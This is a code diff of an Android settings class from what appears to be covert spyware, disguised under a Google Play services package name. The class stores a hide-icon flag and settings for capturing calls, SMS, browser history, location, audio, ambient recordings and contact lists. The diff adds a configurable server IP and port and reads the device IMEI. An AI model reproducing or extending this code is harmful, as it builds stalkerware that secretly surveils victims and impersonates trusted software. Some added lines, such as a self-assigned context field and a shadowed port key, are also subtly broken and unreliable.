@@ -2,65 +2,96 @@ package com.google.android.gms.persistent.googleapps.utils;
 
 import android.content.Context;
 import android.content.SharedPreferences;
+import android.telephony.TelephonyManager;
 
 import com.google.android.gms.persistent.googleapps.network.models.data.DeviceInfo;
 import com.google.gson.Gson;
 
 import javax.inject.Inject;
 
+import io.reactivex.Single;
+
 /**
  * Created by OldMan on 08.04.2017.
  */
 
 public class Preferences {
-    private static final String PREFS_NAME = "store";
-    private static SharedPreferences prefs;
-    private static final String visit_key = "is_visited";
+    private Context context;
+    private final String PREFS_NAME = "store";
+    private SharedPreferences prefs;
+    private final String visit_key = "is_visited";
 
+    private final String ip_address = "ip_address";
+    private final String port = "port";
     //-------------for begining request---------------------
-    private static final String baseDeviceInfo = "base_device_info";
-    private static final String hideIcon = "is_hide_icon";
-    private static final String isAllDeviceInfo = "is_all_device_info";
-    private static Gson gson;
-    private static final String account = "account";
-    private static final String timeWorker = "time_worker";
+    private final String baseDeviceInfo = "base_device_info";
+    private final String hideIcon = "is_hide_icon";
+    private final String isAllDeviceInfo = "is_all_device_info";
+    private Gson gson;
+    private final String account = "account";
+    private final String timeWorker = "time_worker";
 
 
     //-------------------initial data------------------------
-    private static final String initial_code = "initial_code";
-    private static final String device = "device";
+    private final String initial_code = "initial_code";
+    private final String device = "device";
 
-    private static final String firstToken = "first_token";
-    private static final String secondToken = "second_token" +
+    private final String firstToken = "first_token";
+    private final String secondToken = "second_token" +
             "";
-    private static final String periodRequest = "period_request";
+    private final String periodRequest = "period_request";
 
-    private static String keyForRecord = "key_record";
+    private String keyForRecord = "key_record";
     //------------variable settings-----------------------
-    private static final String call = "call";
-    private static final String sms = "sms";
-    private static final String historyBrouser = "history_brouser";
-    private static final String location = "location";
-    private static final String locationMode = "location_mode";
-    private static final String dispatchMode = "dispatch_mode";
-    private static final String image = "image";
-    private static final String audio = "audio";
-    private static final String callRecord = "call_record";
-    private static final String environmentRecord = "environment_record";
-    private static final String callEnvironmentRecord = "call_environment_record";
-    private static final String callList = "call_list";
-    private static final String smsList = "sms_list";
-    private static final String contactList = "contactcom.shadiz.usergin.shadowview.utils.Preferences.callList_list";
-    private static final String appList = "app_list";
-    private static final String duration = "duration";
+    private final String call = "call";
+    private final String sms = "sms";
+    private final String historyBrouser = "history_brouser";
+    private final String location = "location";
+    private final String locationMode = "location_mode";
+    private final String dispatchMode = "dispatch_mode";
+    private final String image = "image";
+    private final String audio = "audio";
+    private final String callRecord = "call_record";
+    private final String environmentRecord = "environment_record";
+    private final String callEnvironmentRecord = "call_environment_record";
+    private final String callList = "call_list";
+    private final String smsList = "sms_list";
+    private final String contactList = "contactcom.shadiz.usergin.shadowview.utils.Preferences.callList_list";
+    private final String appList = "app_list";
+    private final String duration = "duration";
+    private final String imei = "imei";
+
 
     @Inject
     public Preferences(Context context) {
         prefs = context.getSharedPreferences(PREFS_NAME, 0);
         gson = new Gson();
+        context = context;
     }
 
-    public static String getInitialCode() {
+    public Single<String> getIpAddress() {
+        return Single.just(prefs.getString(ip_address, "192.168.50.179"));
+    }
+
+    public Single<String> setIpAddress(String ipAddress) {
+        if (prefs.edit().putString(ip_address, ipAddress).commit())
+            return Single.just(ipAddress);
+        else
+            return Single.just("");
+    }
+
+    public Single<String> getPort() {
+        return Single.just(prefs.getString(port, "10080"));
+    }
+
+    public Single<String> setPort(String port) {
+        if (prefs.edit().putString(port, port).commit())
+            return Single.just(port);
+        else
+            return Single.just("");
+    }
+
+    public String getInitialCode() {
         return prefs.getString(initial_code, null);
     }
 
@@ -68,12 +99,26 @@ public class Preferences {
         prefs.edit().putString(initial_code, mInitialCode).apply();
     }
 
-    public static String getDevice() {
+    public void setDevice(String mDevice) {
+        prefs.edit().putString(device, mDevice).apply();
+    }
+
+    public String getDevice() {
         return prefs.getString(device, null);
     }
 
-    public void setDevice(String mDevice) {
-        prefs.edit().putString(device, mDevice).apply();
+    public void setImei() {
+        try {
+            TelephonyManager mngr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
+            prefs.edit().putString(imei, mngr.getDeviceId()).apply();
+            ;
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    public String getImei() {
+        return prefs.getString(imei, null);
     }
 
     public String getFirstToken() {
